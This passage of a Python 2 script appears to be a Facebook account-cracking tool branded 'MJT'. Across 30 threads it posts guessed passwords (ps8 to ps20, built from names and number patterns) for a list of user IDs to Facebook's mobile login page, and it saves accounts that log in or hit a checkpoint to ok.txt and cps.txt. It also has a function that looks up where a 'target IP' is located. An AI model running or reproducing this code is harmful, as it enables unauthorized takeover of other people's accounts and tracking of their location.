																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																		print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps8+'\033[0;97m')
																		ok = open('ok.txt', 'a')
																		ok.write(uid+'|'+ps8+'\n')
																		ok.close()
																		oks.append(uid+ps8)
																	else:
																		if 'checkpoint' in sp:
																			print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps8+'\033[0;97m')
																			cp = open('cps.txt', 'a')
																			cp.write(uid+'|'+ps8+'\n')
																			cp.close()
																			cps.append(uid+ps8)
																		else:
																			ps9 = bil9
																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps9, 'login': 'submit'})
																			sp = data.content
																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																				print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps9+'\033[0;97m')
																				ok = open('ok.txt', 'a')
																				ok.write(uid+'|'+ps9+'\n')
																				ok.close()
																				oks.append(uid+ps9)
																			else:
																				if 'checkpoint' in sp:
																					print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps9+'\033[0;97m')
																					cp = open('cps.txt', 'a')
																					cp.write(uid+'|'+ps9+'\n')
																					cp.close()
																					cps.append(uid+ps9)
																				else:
																					ps10 = bil10
																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps10, 'login': 'submit'})
																					sp = data.content
																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																						print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps10+'\033[0;97m')
																						ok = open('ok.txt', 'a')
																						ok.write(uid+'|'+ps10+'\n')
																						ok.close()
																						oks.append(uid+ps10)
																					else:
																						if 'checkpoint' in sp:
																							print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps10+'\033[0;97m')
																							cp = open('cps.txt', 'a')
																							cp.write(uid+'|'+ps10+'\n')
																							cp.close()
																							cps.append(uid+ps10)
																						else:
																							ps11 = name + bil11
																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps11, 'login': 'submit'})
																							sp = data.content
																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																								print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps11+'\033[0;97m')
																								ok = open('ok.txt', 'a')
																								ok.write(uid+'|'+ps11+'\n')
																								ok.close()
																								oks.append(uid+ps11)
																							else:
																								if 'checkpoint' in sp:
																									print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps11+'\033[0;97m')
																									cp = open('cps.txt', 'a')
																									cp.write(uid+'|'+ps11+'\n')
																									cp.close()
																									cps.append(uid+ps11)
																								else:
																									ps12 = name + bil12
																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps12, 'login': 'submit'})
																									sp = data.content
																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																										print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps12+'\033[0;97m')
																										ok = open('ok.txt', 'a')
																										ok.write(uid+'|'+ps12+'\n')
																										ok.close()
																										oks.append(uid+ps12)
																									else:
																										if 'checkpoint' in sp:
																											print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps12+'\033[0;97m')
																											cp = open('cps.txt', 'a')
																											cp.write(uid+'|'+ps12+'\n')
																											cp.close()
																											cps.append(uid+ps12)
																										else:
																											ps13 = name + bil13
																											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps13, 'login': 'submit'})
																											sp = data.content
																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																												print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps13+'\033[0;97m')
																												ok = open('ok.txt', 'a')
																												ok.write(uid+'|'+ps13+'\n')
																												ok.close()
																												oks.append(uid+ps13)
																											else:
																												if 'checkpoint' in sp:
																													print(' \033[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps13+'\033[0;97m')
																													cp = open('cps.txt', 'a')
																													cp.write(uid+'|'+ps13+'\n')
																													cp.close()
																													cps.append(uid+ps13)
																												else:
																													ps14 = bil14
																													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps14, 'login': 'submit'})
																													sp = data.content
																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																														print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps14+'\033[0;97m')
																														ok = open('ok.txt', 'a')
																														ok.write(uid+'|'+ps14+'\n')
																														ok.close()
																														oks.append(uid+ps14)
																													else:
																														if 'checkpoint' in sp:
																															print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps14+'\033[0;97m')
																															cp = open('cps.txt', 'a')
																															cp.write(uid+'|'+ps14+'\n')
																															cp.close()
																															cps.append(uid+ps14)
																														else:
																															ps15 = bil15
																															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps15, 'login': 'submit'})
																															sp = data.content
																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps15+'\033[0;97m')
																																ok = open('ok.txt', 'a')
																																ok.write(uid+'|'+ps15+'\n')
																																ok.close()
																																oks.append(uid+ps15)
																															else:
																																if 'checkpoint' in sp:
																																	print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps15+'\033[0;97m')
																																	cp = open('cps.txt', 'a')
																																	cp.write(uid+'|'+ps15+'\n')
																																	cp.close()
																																	cps.append(uid+ps15)
																																else:
																																	ps16 = name + bil16
																																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps16, 'login': 'submit'})
																																	sp = data.content
																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																		print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps16+'\033[0;97m')
																																		ok = open('ok.txt', 'a')
																																		ok.write(uid+'|'+ps16+'\n')
																																		ok.close()
																																		oks.append(uid+ps16)
																																	else:
																																		if 'checkpoint' in sp:
																																			print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps16+'\033[0;97m')
																																			cp = open('cps.txt', 'a')
																																			cp.write(uid+'|'+ps16+'\n')
																																			cp.close()
																																			cps.append(uid+ps16)
																																		else:
																																			ps17 = name + bil17
																																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps17, 'login': 'submit'})
																																			sp = data.content
																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																				print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps17+'\033[0;97m')
																																				ok = open('ok.txt', 'a')
																																				ok.write(uid+'|'+ps17+'\n')
																																				ok.close()
																																				oks.append(uid+ps17)
																																			else:
																																				if 'checkpoint' in sp:
																																					print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps17+'\033[0;97m')
																																					cp = open('cps.txt', 'a')
																																					cp.write(uid+'|'+ps17+'\n')
																																					cp.close()
																																					cps.append(uid+ps17)
																																				else:
																																					ps18 = name + bil18
																																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps18, 'login': 'submit'})
																																					sp = data.content
																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																						print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps18+'\033[0;97m')
																																						ok = open('ok.txt', 'a')
																																						ok.write(uid+'|'+ps18+'\n')
																																						ok.close()
																																						oks.append(uid+ps18)
																																					else:
																																						if 'checkpoint' in sp:
																																							print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps18+'\033[0;97m')
																																							cp = open('cps.txt', 'a')
																																							cp.write(uid+'|'+ps18+'\n')
																																							cp.close()
																																							cps.append(uid+ps18)
																																						else:
																																							ps19 = bil19
																																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps19, 'login': 'submit'})
																																							sp = data.content
																																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																								print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps19+'\033[0;97m')
																																								ok = open('ok.txt', 'a')
																																								ok.write(uid+'|'+ps19+'\n')
																																								ok.close()
																																								oks.append(uid+ps19)
																																							else:
																																								if 'checkpoint' in sp:
																																									print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps19+'\033[0;97m')
																																									cp = open('cps.txt', 'a')
																																									cp.write(uid+'|'+ps19+'\n')
																																									cp.close()
																																									cps.append(uid+ps19)
																																								else:
																																									ps20 = bil20
																																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps20, 'login': 'submit'})
																																									sp = data.content
																																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																										print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps20+'\033[0;97m')
																																										ok = open('ok.txt', 'a')
																																										ok.write(uid+'|'+ps20+'\n')
																																										ok.close()
																																										oks.append(uid+ps20)
																																									else:
																																										if 'checkpoint' in sp:
																																											print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps20+'\033[0;97m')
																																											cp = open('cps.txt', 'a')
																																											cp.write(uid+'|'+ps20+'\n')
																																											cp.close()
																																											cps.append(uid+ps20)
																																										
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	print ("\x1b[1;96m[!]\x1b[1;93mProcess has been complete")
	print ("\x1b[1;96m[!]\x1b[1;92mTotal OK  "+str(len(oks)))
	print ("\x1b[1;96m[!]\x1b[1;91mTotal CP  "+str(len(cps)))
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	raw_input("\x1b[1;97mTo Go Back Press Enter  ")
	menu()
	
def iploc():
    select = raw_input("\n\t\033[1;33mTARGET IP\033[1;0m : ")
    jalan("\n\t\033[1;93mkindly Copy Postal Code & Paste In Your Google \tMap To Get Location  \033[1;92m")
    jalan("\t\033[1;93m Copy This & Paste In Your Browser To Get \tPostal Code & Full Details \033[1;92m")
    print("\n\tipapi.co/"+select)
    raw_input("\n\x1b[1;97mTo Go Back Press Enter  ")
    os.system('python2 MJT.py')

def s_b():
	os.system('clear')
	os.system('python2 ReadMe.Md')

if __name__ == '__main__':
	main()